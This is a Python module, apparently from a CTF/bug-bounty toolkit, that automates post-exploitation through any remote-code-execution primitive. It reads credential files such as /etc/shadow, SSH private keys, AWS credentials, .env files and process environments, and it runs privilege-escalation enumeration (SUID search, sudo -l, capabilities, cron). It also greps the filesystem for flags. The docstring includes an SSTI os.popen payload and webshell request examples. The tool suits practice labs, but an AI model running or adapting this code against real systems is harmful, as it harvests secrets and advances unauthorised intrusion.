"""Flag hunter — enumerate filesystem and extract flags via any RCE.

Once RCE is achieved (SSTI, CMDi, deserialization, webshell), this module
runs filesystem enumeration to find flags, credentials, and secrets.

Usage:
    from bugbounty_ctf.flag_hunter import FlagHunter

    hunter = FlagHunter(exec_fn=my_rce_function)
    flags = hunter.hunt()
    # Or with specific commands:
    hunter.run_command("cat /root/flag.txt")
"""

from __future__ import annotations

import re
import shlex
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Any

FLAG_PATTERNS = [
    r"HTB\{[^}]+\}",
    r"flag\{[^}]+\}",
    r"CTF\{[^}]+\}",
    r"pwn\{[^}]+\}",
    r"secret\{[^}]+\}",
    r"key\{[^}]+\}",
]

INTERESTING_FILES = [
    "/flag",
    "/flag.txt",
    "/root/flag.txt",
    "/root/flag",
    "/home/*/flag.txt",
    "/home/*/flag",
    "/var/flag",
    "/var/flag.txt",
    "/tmp/flag",
    "/opt/flag",
    "/opt/flag.txt",
    "/etc/flag",
    "/etc/flag.txt",
]

CREDS_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_ed25519",
    "/home/*/.ssh/id_rsa",
    "/home/*/.ssh/id_ed25519",
    "/root/.aws/credentials",
    "/home/*/.aws/credentials",
    "/app/.env",
    "/app/config.yaml",
    "/app/config.json",
    "/app/credentials",
    "/app/secrets",
    "/var/www/html/.env",
    "/var/www/html/config.php",
    "/proc/self/environ",
    "/proc/1/environ",
]

PRIVESC_COMMANDS = [
    "find / -perm -4000 -type f 2>/dev/null",
    "find / -perm -2000 -type f 2>/dev/null",
    "ls -la /etc/crontab 2>/dev/null; cat /etc/crontab 2>/dev/null",
    "cat /etc/cron.d/* 2>/dev/null",
    "ls -la /etc/cron* 2>/dev/null",
    "find / -name '*.service' -writable 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "sudo -l 2>/dev/null",
    "env 2>/dev/null",
    "id; whoami; hostname",
]


@dataclass
class HuntResult:
    """Result from a flag hunting expedition."""

    flags: list[str] = field(default_factory=list)
    credentials: list[str] = field(default_factory=list)
    interesting_files: list[dict[str, str]] = field(default_factory=list)
    privesc_findings: list[str] = field(default_factory=list)
    command_outputs: dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "flags": self.flags,
            "credentials": [c[:50] for c in self.credentials],
            "interesting_files": self.interesting_files,
            "privesc_findings": self.privesc_findings,
            "command_outputs": {k: v[:200] for k, v in self.command_outputs.items()},
        }


class FlagHunter:
    """Enumerate filesystem via RCE to find flags and credentials.

    Takes an exec_fn callable that executes a command on the target
    and returns the output as a string. This can be:
    - SSTI RCE: exec_fn = lambda cmd: ssti_rce(f"{{{{__import__('os').popen('{cmd}').read()}}}}")
    - CMDi: exec_fn = lambda cmd: requests.post(url, data={"cmd": cmd}).text
    - Webshell: exec_fn = lambda cmd: requests.post(url, data={"c": cmd}).text
    - SSH: exec_fn = lambda cmd: ssh_exec(cmd)
    """

    def __init__(self, exec_fn: Callable[[str], str]) -> None:
        self.exec_fn = exec_fn
        self.result = HuntResult()

    def run_command(self, command: str) -> str:
        """Execute a command via the RCE and return output."""
        try:
            output = self.exec_fn(command)
            self.result.command_outputs[command] = output
            return output
        except Exception as e:
            return f"[ERROR: {e}]"

    def hunt(self) -> HuntResult:
        """Run full flag hunting expedition."""
        print(f"\n{'=' * 60}")
        print("[FLAG HUNTER] Starting filesystem enumeration")
        print(f"{'=' * 60}")

        self._check_identity()
        self._search_filesystem()
        self._read_creds_files()
        self._check_privesc()
        self._grep_flags()

        print(f"\n[FLAG HUNTER] Found {len(self.result.flags)} flags")
        if self.result.flags:
            for flag in self.result.flags:
                print(f"  [FLAG] {flag}")
        if self.result.credentials:
            print(f"  Found {len(self.result.credentials)} credential files")

        return self.result

    def _check_identity(self) -> None:
        """Check who we are and what we can access."""
        output = self.run_command("id; whoami; hostname; uname -a")
        print(f"  Identity: {output[:200]}")

        output = self.run_command("pwd; ls -la /")
        print(f"  Filesystem root: {output[:200]}")

    def _search_filesystem(self) -> None:
        """Search filesystem for flag files."""
        print("  [*] Searching for flag files...")

        for filepath in INTERESTING_FILES:
            output = self.run_command(f"cat {filepath} 2>/dev/null")
            if output and output.strip() and "[ERROR" not in output:
                flags = self._extract_flags(output)
                if flags:
                    self.result.flags.extend(flags)
                    print(f"    [FLAG] {filepath}: {flags}")
                else:
                    self.result.interesting_files.append(
                        {
                            "path": filepath,
                            "content": output[:200],
                        }
                    )
                    print(f"    [!] {filepath}: {output[:100]}")

        output = self.run_command("find / -name 'flag*' -o -name '*.flag' 2>/dev/null | head -20")
        if output and output.strip():
            for line in output.strip().split("\n"):
                line = line.strip()
                if line:
                    content = self.run_command(f"cat {shlex.quote(line)} 2>/dev/null")
                    flags = self._extract_flags(content)
                    if flags:
                        self.result.flags.extend(flags)
                        print(f"    [FLAG] {line}: {flags}")

    def _read_creds_files(self) -> None:
        """Read credential files."""
        print("  [*] Reading credential files...")

        for filepath in CREDS_FILES:
            output = self.run_command(f"cat {filepath} 2>/dev/null")
            if output and output.strip() and "[ERROR" not in output and "No such" not in output:
                self.result.credentials.append(output)
                flags = self._extract_flags(output)
                if flags:
                    self.result.flags.extend(flags)
                print(f"    [!] {filepath}: {output[:100]}")

    def _check_privesc(self) -> None:
        """Check for privilege escalation vectors."""
        print("  [*] Checking privesc vectors...")

        for cmd in PRIVESC_COMMANDS:
            output = self.run_command(cmd)
            if output and output.strip() and "[ERROR" not in output:
                self.result.privesc_findings.append(f"{cmd}: {output[:200]}")
                if output.strip() != "":
                    print(f"    {cmd[:50]}: {output[:100]}")

    def _grep_flags(self) -> None:
        """Grep the filesystem for flag patterns."""
        print("  [*] Grepping for flags...")

        for pattern in ["HTB{", "flag{", "CTF{"]:
            output = self.run_command(f"grep -r '{pattern}' / 2>/dev/null | head -20")
            if output and output.strip():
                flags = self._extract_flags(output)
                if flags:
                    self.result.flags.extend(flags)
                    for line in output.strip().split("\n"):
                        if pattern in line:
                            print(f"    [FLAG] {line[:150]}")

    @staticmethod
    def _extract_flags(text: str) -> list[str]:
        """Extract all flag patterns from text."""
        flags: list[str] = []
        for pattern in FLAG_PATTERNS:
            flags.extend(re.findall(pattern, text, re.IGNORECASE))
        return list(set(flags))


def hunt_flags(exec_fn: Callable[[str], str]) -> dict[str, Any]:
    """High-level function: take an RCE function and hunt for flags.

    Args:
        exec_fn: A callable that takes a shell command and returns
                 the output as a string.

    Returns:
        Dict with flags, credentials, and privesc findings.
    """
    hunter = FlagHunter(exec_fn)
    result = hunter.hunt()
    return result.to_dict()
